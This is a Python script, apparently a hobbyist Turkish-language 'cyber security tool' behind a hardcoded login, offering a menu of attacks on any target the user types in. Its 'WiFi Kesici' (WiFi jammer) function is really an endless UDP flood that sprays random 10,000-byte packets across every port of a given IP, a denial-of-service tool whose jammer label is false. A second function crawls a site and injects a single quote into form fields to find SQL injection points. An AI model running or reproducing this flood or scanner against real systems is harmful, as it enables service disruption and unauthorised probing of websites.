import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import time
from colorama import init, Fore
import hashlib
import os
import socket
import random
from datetime import datetime

init(autoreset=True)

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def hash_password(password):
    return hashlib.sha256(password.encode('utf-8')).hexdigest()

def wifi_jammer():
    clear_screen()
    print('\033[91m')
    ip = input("Hedef IP: ")
    port = int(input("Hedef Port: "))

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(10000)
    timeout = time.time()

    clear_screen()
    print("\033[91mWiFi Kesici Görev Başlatılıyor")
    print("\033[91m[                    ] 0% ")
    time.sleep(5)
    print("\033[92m[=====               ] 25%")
    time.sleep(5)
    print("\033[92m[==========          ] 50%")
    time.sleep(5)
    print("\033[92m[===============     ] 75%")
    time.sleep(5)
    print("\033[92m[====================] 100%")
    time.sleep(3)
    clear_screen()

    sent = 0
    while True:
        while 1:
            if time.time() > timeout:
                break
            else:
                pass
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print("\033[92m%s paket %s üzerinden başarılı bir şekilde gönderildi" % (sent, ip))
        if port == 65534:
            port = 1

correct_username = "1"
correct_password = hash_password("1")
max_attempts = 3
lock_time = 60  # Kilitlenme süresi (saniye)

def print_color(text, color):
    print(color + text)

def check_sql_injection(url, params):
    try:
        response = requests.get(url, params=params)
        response.raise_for_status()
        if "SQL syntax" in response.text:
            return True
    except requests.RequestException as err:
        print_color("\033[91mHTTP isteği başarısız oldu. Hata: {}".format(err), Fore.RED)
    return False

def crawl_and_check_sql_injection(url, depth=2, params=None):
    visited = set()
    to_visit = [(url, 0)]
    sql_vulnerable_urls = []

    print_color("\033[93mSQL taraması başlatılıyor...", Fore.YELLOW)

    start_time = time.time()

    while to_visit and time.time() - start_time < 35:
        current_url, current_depth = to_visit.pop(0)
        print_color("\033[94mTaranan URL: {}".format(current_url), Fore.BLUE)

        if current_url in visited:
            continue

        visited.add(current_url)

        try:
            response = requests.get(current_url)
            response.raise_for_status()

            if response.status_code == 200:
                soup = BeautifulSoup(response.text, "html.parser")
                forms = soup.find_all("form")
                for form in forms:
                    inputs = form.find_all("input", {"type": "text"})
                    for input_tag in inputs:
                        if params is None:
                            params = {}
                        params[input_tag.get("name")] = "'"
                        if check_sql_injection(current_url, params):
                            sql_vulnerable_urls.append(current_url)
                            break

                if current_depth < depth:
                    links = soup.find_all("a", href=True)
                    for link in links:
                        absolute_link = urljoin(current_url, link["href"])
                        to_visit.append((absolute_link, current_depth + 1))

        except requests.RequestException as err:
            print_color("\033[91mHTTP isteği başarısız oldu. Hata: {}".format(err), Fore.RED)

    return sql_vulnerable_urls

def print_results(sql_vulnerable_urls):
    clear_screen()
    print_color("\033[92mTarama tamamlandı.", Fore.GREEN)

    if sql_vulnerable_urls:
        print_color("\033[92mPotansiyel SQL enjeksiyonu bulunan URL'ler:", Fore.GREEN)
        for url in sql_vulnerable_urls:
            print_color("\033[92m  - {}".format(url), Fore.GREEN)
    else:
        print_color("\033[91mŞansız bir URL...", Fore.RED)

def sql_menu():
    clear_screen()
    print_color("\033[93mSQL Tarama Aracına Hoş Geldiniz", Fore.YELLOW)

    start_url = input("\033[96mLütfen başlangıç URL'sini girin: ")
    sql_vulnerable_urls = crawl_and_check_sql_injection(start_url)
    print_results(sql_vulnerable_urls)

def wifi_jammer_menu():
    clear_screen()
    print_color("\033[93mWiFi Kesici Aracına Hoş Geldiniz", Fore.YELLOW)
    print_frame("WiFi Kesici Bilgileri")
    print_color("\033[94mHedef IP: {}".format(input("Hedef IP: ")), Fore.BLUE)
    print_color("\033[94mHedef Port: {}".format(input("Hedef Port: ")), Fore.BLUE)
    wifi_jammer()

def print_frame(text):
    frame_width = len(text) + 6
    print("-" * frame_width)
    print("|  {}  |".format(text))
    print("-" * frame_width)

def show_menu():
    attempts = 0
    while attempts < max_attempts:
        print_frame("Kullanıcı Girişi")
        login_username = input("Kullanıcı Adı: ")
        login_password = hash_password(input("Şifre: "))

        if login_username == correct_username and login_password == correct_password:
            print_frame("Hoş geldiniz!")
            show_main_menu()
            clear_screen()
            break
        else:
            attempts += 1
            print_frame("Yanlış kullanıcı adı veya şifre. Dostum, güle güle!")

            if attempts < max_attempts:
                print_color("\033[91mKalan giriş hakkınız: {}. Lütfen tekrar deneyin.".format(max_attempts - attempts), Fore.RED)
                time.sleep(lock_time)
                clear_screen()

    if attempts == max_attempts:
        print_frame("Maksimum giriş hakkınızı aştınız. {} saniye sonra tekrar deneyin.".format(lock_time))
        time.sleep(lock_time)
        clear_screen()

def show_main_menu():
    while True:
        print_color("\n--- Menü ---", Fore.YELLOW)
        print_color("1. SQL Tarama", Fore.YELLOW)
        print_color("2. QR Kod Oluşturucu", Fore.YELLOW)
        print_color("3. WiFi Kesici", Fore.YELLOW)
        print_color("4. Çıkış", Fore.YELLOW)

        choice = input("Lütfen bir seçenek girin (1-4): ")

        if choice == "1":
            sql_menu()
        elif choice == "2":
            print_color("QR Kod Oluşturucu açılıyor...", Fore.MAGENTA)
        elif choice == "3":
            wifi_jammer_menu()
        elif choice == "4":
            print_color("Çıkış yapılıyor. Dostum, güle güle!", Fore.GREEN)
            break
        else:
            print_color("Geçersiz seçenek! Lütfen tekrar deneyin.", Fore.YELLOW)

if __name__ == "__main__":
    clear_screen()

    ascii_art = """
    :::  === :::===== :::      :::      :::====       :::  === :::===  :::===== :::====
    :::  === :::      :::      :::      :::  ===      :::  === :::     :::      :::  ===
    ======== ======   ===      ===      ===  ===      ===  ===  =====  ======   ======= 
    ===  === ===      ===      ===      ===  ===      ===  ===     === ===      === === 
    ===  === ======== ======== ========  ======        ======  ======  ======== ===  ===
    """
    print_frame(ascii_art)
    print_color("\033[95mHello User! Siber Güvenlik Aracına Hoş Geldiniz", Fore.MAGENTA)

    show_menu()
